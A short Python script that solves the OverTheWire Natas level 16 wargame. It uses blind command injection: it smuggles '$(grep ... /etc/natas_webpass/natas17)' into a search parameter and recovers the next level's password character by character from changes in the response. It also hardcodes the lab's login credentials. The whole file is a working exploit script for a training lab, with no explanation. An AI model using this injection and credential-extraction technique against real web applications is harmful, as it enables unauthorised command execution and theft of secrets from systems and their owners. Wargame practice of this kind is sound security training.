#!/bin/python
import requests,string
import sys

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

password = ''
password_dictionary=[]
exists_str = "African"

for char in characters:
        uri = ''.join([url,'?','needle=African','%24(grep+',char,'+%2Fetc%2Fnatas_webpass%2Fnatas17)','&submit=Search'])
        # print(uri)
        # print(password)
        r = requests.get(uri, auth=(auth_username,auth_password))
        sys.stdout.write("Password_dictionary : {0}_ {1} \r".format(''.join(password),char))
        sys.stdout.flush()
        if not exists_str in r.text:
            # print("hello")
            password_dictionary.append(char)

print("Password_dictionary : {0}".format(password_dictionary))

for i in range(1,33):
    for char in password_dictionary:
        test = ''.join([password, char])
        uri = ''.join([url,'?','needle=African','%24(grep+^',test,'+%2Fetc%2Fnatas_webpass%2Fnatas17)','&submit=Search'])
        # print(uri)
        # print(password)
        r = requests.get(uri, auth=(auth_username,auth_password))
        sys.stdout.write("Password : {0}_ {1} \r".format(''.join(password),char))
        sys.stdout.flush()
        if not exists_str in r.text:
            # print("hello")
            password = ''.join([password, char])
            break
            # print("Password Dictionary: {0}".format(''.join(password_dictionary)))

print("Password : {0}".format(password))